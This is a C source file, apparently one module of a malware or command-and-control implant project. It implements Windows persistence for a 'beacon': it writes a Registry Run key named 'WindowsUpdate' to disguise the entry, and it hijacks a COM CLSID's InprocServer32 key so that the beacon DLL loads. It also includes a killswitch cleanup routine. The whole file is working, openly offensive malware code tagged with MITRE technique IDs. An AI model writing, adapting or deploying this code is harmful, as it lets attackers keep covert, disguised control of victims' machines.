// src/persist.c
// Mod 180: Persistence — Registry Run key + COM hijack stub
#include <windows.h>
#include <stdio.h>

// -- T1547.001: Registry Run key persistence --------------------------
// Adds beacon path to HKCU\...\Run so it starts on logon
BOOL persist_registry_run(LPCSTR exePath) {
    HKEY hKey = NULL;
    LONG status = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (status != ERROR_SUCCESS) {
        printf("[!] persist_registry_run: RegOpenKeyEx failed: %ld\n", status);
        return FALSE;
    }

    status = RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                            (const BYTE*)exePath, (DWORD)strlen(exePath) + 1);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        printf("[!] persist_registry_run: RegSetValueEx failed: %ld\n", status);
        return FALSE;
    }

    printf("[+] Registry Run key set: %s\n", exePath);
    return TRUE;
}

// -- T1546.015: COM hijack stub (DLL persistence) ---------------------
// Writes our beacon DLL path into a COM CLSID InprocServer32 key
// Using CLSID for "CAccPropServicesClass" — commonly hijackable
// {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
static const char* COM_CLSID_PATH =
    "SOFTWARE\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}"
    "\\InprocServer32";

BOOL persist_com_hijack(LPCSTR dllPath) {
    HKEY hKey = NULL;
    LONG status = RegCreateKeyExA(
        HKEY_CURRENT_USER, COM_CLSID_PATH,
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE, NULL, &hKey, NULL);

    if (status != ERROR_SUCCESS) {
        printf("[!] persist_com_hijack: RegCreateKeyEx failed: %ld\n", status);
        return FALSE;
    }

    // Set default value to our DLL path
    status = RegSetValueExA(hKey, NULL, 0, REG_SZ,
                            (const BYTE*)dllPath, (DWORD)strlen(dllPath) + 1);
    if (status != ERROR_SUCCESS) {
        printf("[!] persist_com_hijack: RegSetValueEx (default) failed: %ld\n",
               status);
        RegCloseKey(hKey);
        return FALSE;
    }

    // Set ThreadingModel
    const char* model = "Both";
    RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ,
                   (const BYTE*)model, (DWORD)strlen(model) + 1);

    RegCloseKey(hKey);
    printf("[+] COM hijack set: %s\n", dllPath);
    return TRUE;
}

// -- Remove persistence (cleanup for killswitch) ----------------------
BOOL persist_remove() {
    // Remove Run key
    HKEY hKey = NULL;
    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_SET_VALUE, &hKey);
    if (hKey) {
        RegDeleteValueA(hKey, "WindowsUpdate");
        RegCloseKey(hKey);
    }

    // Remove COM hijack key
    RegDeleteKeyA(HKEY_CURRENT_USER, COM_CLSID_PATH);

    printf("[+] Persistence removed\n");
    return TRUE;
}
